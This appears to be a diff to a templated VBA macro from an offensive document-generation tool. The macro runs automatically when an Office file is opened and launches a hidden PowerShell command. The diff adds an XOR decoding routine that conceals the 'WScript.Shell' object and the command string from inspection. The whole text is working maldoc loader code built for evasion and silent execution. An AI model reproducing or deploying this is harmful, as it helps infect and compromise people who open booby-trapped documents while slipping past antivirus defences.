@@ -1,7 +1,8 @@
 Sub %{sub_auto_open}()
   Dim %{var_powershell}
   %{var_powershell} = %{powershell}
-  Call Shell(%{var_powershell}, vbHide)
+  Dim %{var_shell} : Set %{var_shell} = CreateObject(%{function_xor}(%{xor_wscript_shell},"%{xor_key}"))
+  %{var_shell}.Run %{function_xor}(%{xor_data},"%{xor_key}") & " " & %{var_powershell}, 0, False
 End Sub
 Sub AutoOpen()
   %{sub_auto_open}
@@ -10,3 +11,12 @@ Sub Workbook_Open()
   %{sub_auto_open}
 End Sub
 
+Private Function %{function_xor}(ByVal %{var_data} As String, ByVal %{var_key} As String) As String
+ Dim %{var_i} As Integer: Dim %{var_j} As Integer: Dim %{var_place} As String
+ %{var_i} = Len(%{var_key}$)
+ For %{var_j}  = 1 To Len(%{var_data})
+   %{var_place} = Asc(Mid$(%{var_key}$, (%{var_j}  Mod %{var_i}) - %{var_i} * ((%{var_j}  Mod %{var_i}) = 0), 1))
+   Mid$(%{var_data}, %{var_j} , 1) = Chr$(Asc(Mid$(%{var_data}, %{var_j} , 1)) Xor %{var_place})
+ Next
+ %{function_xor} = %{var_data}
+End Function
